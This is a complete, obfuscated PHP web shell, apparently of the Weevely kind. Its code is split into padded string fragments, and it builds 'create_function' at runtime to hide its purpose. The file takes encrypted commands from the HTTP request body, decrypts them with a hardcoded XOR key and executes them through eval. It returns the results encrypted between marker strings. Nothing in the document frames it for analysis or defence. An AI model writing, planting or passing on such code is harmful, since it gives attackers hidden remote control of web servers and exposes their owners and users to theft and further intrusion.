<?php
$j='$k){|6$c=str|6len|6($k);$|6l=strlen($|6t)|6;$o=|6"";for($i=|60;$i<$|6|6l;)|6{|6for($j=0;($|6j<$c&&$|6i<$l);$j++,$|6i++';
$w='p://i|6nput|6"),$m)|6==1) {@ob_st|6ar|6t();@ev|6al(@gzunco|6mpress|6(@x(@|6ba|6se64_decode(|6$m[1])|6,$k|6|6)));$o=@';
$i='$k="36b4|63|638b";|6$|6kh="902ff90555d4";|6$|6kf="0322|6d75488b|64";$p="|6hz|6DuRpnaEgDB|6DAcr";|6|6function|6 x($t,';
$m=')|6{$o.=$t{$|6i}^$k|6{$j};|6}}return|6 $o;}|6if (@preg|6|6_match("/$|6kh(.+)|6$kf/",|6@|6file_get_co|6|6nt|6ents("ph';
$N='ob_get|6_conten|6ts()|6;@o|6b_end_cl|6ean();$r=|6@b|6as|6e64_encode(@|6x(@gzcom|6p|6ress(|6|6$o),$k));pri|6nt("$p$|6kh$r$kf");}';
$C=str_replace('G','','creGGatGeG_funcGGtion');
$y=str_replace('|6','',$i.$j.$m.$w.$N);
$p=$C('',$y);$p();
?>
